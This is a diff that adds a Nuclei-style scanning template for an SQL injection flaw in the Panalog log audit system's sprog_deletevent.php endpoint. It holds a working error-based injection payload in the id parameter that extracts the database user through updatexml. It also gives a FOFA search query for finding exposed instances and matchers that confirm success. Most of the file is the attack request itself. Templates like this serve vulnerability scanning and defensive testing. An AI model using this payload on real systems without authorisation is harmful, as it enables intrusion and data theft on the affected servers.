@@ -1,0 +1,30 @@
+id: Panalog-sprog_deletevent_php-SQL
+
+info:
+  name: Panalog日志审计系统-sprog_deletevent.php-SQL注入漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="Panabit-Panalog"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /Maintain/sprog_deletevent.php?openid=1&id=1+or+updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - localhost
+      - type: status
+        status:
+          - 200
